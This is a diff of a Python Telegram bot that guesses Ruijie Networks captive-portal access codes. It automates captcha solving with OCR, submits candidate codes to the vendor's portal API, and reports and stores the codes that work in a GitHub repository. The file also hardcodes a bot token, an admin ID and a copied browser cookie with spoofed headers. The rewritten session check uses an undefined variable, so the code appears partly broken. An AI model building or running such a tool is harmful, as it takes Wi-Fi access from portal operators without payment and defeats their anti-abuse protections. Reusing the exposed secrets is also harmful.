@@ -10,7 +10,7 @@ from datetime import datetime, timedelta, timezone
 BOT_TOKEN = "8920875247:AAHowI29h7xFaDbyk9bCWXvsxIYhrk9CdVw"
 ADMIN_ID = "1901101365"
 
-# GitHub Configuration (Render Environment Variables)
+# GitHub Configuration (Render Environment Variables မှ ယူပါမည်)
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
 GITHUB_REPO = os.environ.get("GITHUB_REPO")
 
@@ -46,7 +46,7 @@ async def web_server():
 
 async def get_file_content(path):
     if not GITHUB_TOKEN or not GITHUB_REPO:
-        print("GitHub configuration missing")
+        print("GitHub config missing")
         return {}, None
     url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
     headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
@@ -57,37 +57,23 @@ async def get_file_content(path):
                     data = await resp.json()
                     content = base64.b64decode(data['content']).decode('utf-8')
                     return json.loads(content), data['sha']
-                elif resp.status == 404:
-                    return {}, None
-                else:
-                    print(f"GitHub Fetch Error: {resp.status}")
-                    return {}, None
-    except Exception as e:
-        print(f"GitHub Get Content Error: {e}")
-        return {}, None
+                return {}, None
+    except: return {}, None
 
 async def update_file_content(path, content, sha, message):
-    if not GITHUB_TOKEN or not GITHUB_REPO:
-        return "No Config"
+    if not GITHUB_TOKEN or not GITHUB_REPO: return "No Config"
     url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
     headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
     payload = {
         "message": message,
         "content": base64.b64encode(json.dumps(content, indent=4).encode('utf-8')).decode('utf-8')
     }
-    if sha:
-        payload["sha"] = sha
+    if sha: payload["sha"] = sha
     try:
         async with aiohttp.ClientSession() as sess:
             async with sess.put(url, headers=headers, json=payload) as resp:
-                if resp.status in [200, 201]:
-                    return "saved"
-                else:
-                    print(f"GitHub Update Error: {resp.status}")
-                    return "failed"
-    except Exception as e:
-        print(f"GitHub Update Content Error: {e}")
-        return str(e)
+                return "saved" if resp.status in [200, 201] else "failed"
+    except: return "error"
 
 @bot.message_handler(commands=['start'])
 async def start(message):
@@ -185,10 +171,29 @@ def generate_expiry(plan):
     if plan == "unlimited": return "9999-12-31T23:59:59Z"
     return (now + timedelta(minutes=plans.get(plan, 0))).isoformat() if plan in plans else None
 
-async def check_session_url(url):
-    if "ruijienetworks.com" in url:
-        return True
-    return False
+async def check_session_url(session_url):
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+        'referer': session_url,
+        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+    }
+    try:
+        async with session.get(session_url, headers=headers, allow_redirects=True) as response:
+            final_url = str(response.url)
+            return "sessionId" in final_url
+    except Exception as e:
+        print(f"Session URL Check Error: {e}")
+        return False
 
 @bot.message_handler(commands=['input'])
 async def handle_input(message):
@@ -233,7 +238,7 @@ async def stop_scan(message):
 
 async def github_update_scheduler():
     while True:
-        await asyncio.sleep(60)
+        await asyncio.sleep(80)
         items = []
         while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
         if items:
@@ -308,21 +313,23 @@ async def perform_check(session_url, code, chat_id, scan_id, message=None):
         sid = await get_session_id(sess, session_url)
         if not sid: return
         for _ in range(5):
-            img = await sess.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}')
-            img_bytes = await img.read()
-            text = await asyncio.to_thread(lambda: _ocr.classification(img_bytes).upper())
-            v = await sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': text})
-            v_data = await v.json()
-            if v_data.get("success"):
-                data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": text}
-                async with sess.post(post_url, json=data) as req:
-                    resp = await req.json()
-                    if 'logonUrl' in str(resp):
-                        if chat_id not in success_texts: success_texts[chat_id] = []
-                        success_texts[chat_id].append(f"🎫 {code}")
-                        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
-                        await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
-                    return
+            try:
+                img = await sess.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}')
+                img_bytes = await img.read()
+                text = await asyncio.to_thread(lambda: _ocr.classification(img_bytes).upper())
+                v = await sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': text})
+                v_data = await v.json()
+                if v_data.get("success"):
+                    data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": text}
+                    async with sess.post(post_url, json=data) as req:
+                        resp = await req.text()
+                        if 'logonUrl' in resp:
+                            if chat_id not in success_texts: success_texts[chat_id] = []
+                            success_texts[chat_id].append(f"🎫 {code}")
+                            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
+                            await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
+                        return
+            except: pass
     retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
 
 _ocr = ddddocr.DdddOcr(show_ad=False)
